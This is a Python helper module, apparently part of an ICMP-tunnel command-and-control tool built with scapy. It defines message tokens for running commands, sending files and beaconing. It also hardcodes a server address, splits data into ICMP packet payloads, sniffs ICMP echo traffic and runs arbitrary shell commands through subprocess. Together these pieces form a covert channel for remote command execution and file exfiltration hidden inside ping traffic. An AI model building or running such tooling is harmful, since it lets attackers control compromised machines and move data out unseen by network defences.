import os
from scapy.all import *
import signal
import subprocess
import threading


from scapy.all import *
import threading

FILE = b'filexx'           # module to send file
RUN = b'runxxx'            # module to run command
BEACON = b'beacon'          # client is ready to recieve command
BEGIN_OUTPUT = b'begino'    # server to open output_file
BEGIN_FILE = b'beginf'       # server to open file - name of the file in the data
IN_TRANSFER = b'transf'      # server to continue writing to the opened file
EF = b'eofeof'              # server to close the opened file

SERVER_ADR = "192.168.1.22"
ICMP_RESPONSE = "icmp[0]=0"
ICMP_REQUEST = "icmp[0]=8"

LOG_OUTPUT = ".log_output.txt"
MTU_SIZE = 1500
HEADER_SIZE = 100


def pkt_send(pkt_no_data,data,is_output):
    for chunk in range(0, len(data), MTU_SIZE - HEADER_SIZE):
        x = chunk
        if is_output == 1:
            content = IN_TRANSFER
            content+=data[x:x+1400]
            pkt = pkt_no_data/content
        else:
            pkt = pkt_no_data/data[x:x+1400]
        send(pkt)

def sniff_pkt(pfilter,handler,cnt=30,timer=1000):
    capture = sniff(filter=pfilter,count=cnt,prn=handler,timeout=timer)
    
def signal_handler(sig, frame):
    print(' Exiting...')
    sys.exit(0)
    
    
def RunCommand(cmd):
    return subprocess.getoutput(cmd)
    # output_stream = os.popen(cmd)
    # pkt_send(dest=server_adr,data=output_stream.read())
    
    
def open_file(file_name):
	flags = os.O_WRONLY|os.O_CREAT|os.O_APPEND
	fd = os.open(file_name,flags)
	return fd

def write_to_file(fd,to_write):
	#encoded_content = to_write.encode('utf-8')
	#os.write(fd,encoded_content)
	os.write(fd,to_write)
        
def close_file(fd):
    os.close(fd)
    
def check_prefix(packet):             #extract 5 first bytes from data
    return packet[0][ICMP].load[:6]

def extract_data(packet):           #extract data (all the data besides the first 5 bytes)
    try:
        return packet[0][Raw].load[6:]
    except:
        return str(None)

def get_packet_id(packet):
    return packet[0][ICMP].id


def str_to_binary(str):
    return ' '.join(format(ord(x), 'b') for x in str)

def bin_to_str(bin_data):
    return bin_data.decode('utf-8')


    
    
    
